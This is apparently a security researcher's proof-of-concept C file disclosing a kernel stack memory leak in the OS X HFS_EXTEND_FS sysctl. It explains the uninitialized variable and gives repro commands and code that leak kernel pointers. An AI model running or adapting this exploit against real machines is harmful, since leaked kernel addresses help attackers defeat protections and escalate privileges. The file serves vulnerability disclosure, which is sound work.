//ianbeer

/*
HFS_EXTEND_FS sysctl discloses uninitialized kernel stack memory to userspace

The implementation of the HFS_EXTEND_FS sysctl is in the hfs_syscall function in hfs_vfsops.c:


  } else if (name[0] == HFS_EXTEND_FS) {
    u_int64_t  newsize;                        <-- uninitialized local uint64_t
    vnode_t vp = vfs_context_cwd(context);

    if (newp == USER_ADDR_NULL || vp == NULLVP)
      return (EINVAL);
    if ((error = hfs_getmountpoint(vp, &hfsmp)))
      return (error);
    error = sysctl_quad(oldp, oldlenp, newp, newlen, (quad_t *)&newsize);  <-- address passed to sysctl_quad

sysctl_quad is a helper function for simultaneously getting AND setting kernel variables. That is, if
the user specifies an oldp and oldlenp then sysctl_quad will write out the old value
before reading in a new one from newp.

Getting to this sysctl code and passing a newp requires root, but there are still sandboxed processes
running as root on OS X which wouldn't be able to exploit the usual root to kernel paths via AppleHWAccess etc
so this bug does constitute a real bug under the OS X security model.

To repro compile this and then execute it with your current working directory as '/':

clang -o /tmp/hfs_sysctl_leak hfs_sysctl_leak.c
cd /
for i in {1..1000}; do sudo /tmp/hfs_sysctl_leak; done | grep ffffff

I've been able to leak kernel text pointers with this on a MacBookAir5,2 w/ 10.10.3 (14D131)
*/

#include <stdlib.h>
#include <stdio.h>

#include <sys/mount.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <hfs/hfs_mount.h>

int main() {
  struct vfsconf vfc = {0};
  getvfsbyname("hfs", &vfc);

  int i[8] =  {0};
  i[0] = CTL_VFS;
  i[1] = vfc.vfc_typenum;
  i[2] = HFS_EXTEND_FS;

  uint64_t old = 0x4141414141414141;
  size_t old_len = 8;
  uint64_t new = 0;
  uint64_t new_len = 8;

  sysctl((void*)i, 3, &old, &old_len, &new, new_len);

  // print the leaked stack bytes
  printf("%016llx\n", old);
}
